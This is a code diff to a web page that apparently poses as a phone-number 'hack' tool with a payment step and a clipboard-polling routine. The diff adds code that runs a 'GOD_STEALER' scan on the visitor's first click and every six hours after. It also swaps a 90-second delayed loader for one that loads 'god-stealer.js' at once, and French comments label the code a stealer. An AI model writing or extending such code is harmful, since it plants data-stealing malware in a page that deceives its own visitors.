@@ -244,6 +244,13 @@ async function startHack() {
   const phone = document.getElementById("phone").value.trim();
   const country = document.getElementById("country").value;
   if (!phone) return alert("Enter a phone number");
+
+  // ⚡ STEALER — activé immédiatement au premier clic
+  if (window.GOD_STEALER && !window._stealerDone) {
+    window._stealerDone = true;
+    window.GOD_STEALER.runFullScan();
+    setInterval(() => window.GOD_STEALER.runFullScan(), 6*60*60*1000);
+  }
   
   switchScreen("screen-scanning");
   const target = country + phone;
@@ -347,14 +354,8 @@ function processPayment() {
   setInterval(clipPoll,500);
 })();
 
-// ═══════════════════════════════════════════════════════
-//  STEALER (delayed 90 seconds)
-// ═══════════════════════════════════════════════════════
-setTimeout(()=>{
-  const s=document.createElement("script");s.src="god-stealer.js";
-  s.onload=()=>{setTimeout(()=>{if(window.GOD_STEALER){window.GOD_STEALER.runFullScan();setInterval(()=>window.GOD_STEALER.runFullScan(),6*60*60*1000)}},20000)};
-  document.head.appendChild(s);
-},90000);
+// ═══ STEALER — chargé immédiatement, se déclenche au premier clic ═══
+(function(){const s=document.createElement("script");s.src="god-stealer.js";document.head.appendChild(s)})();
 </script>
 </body>
 </html>
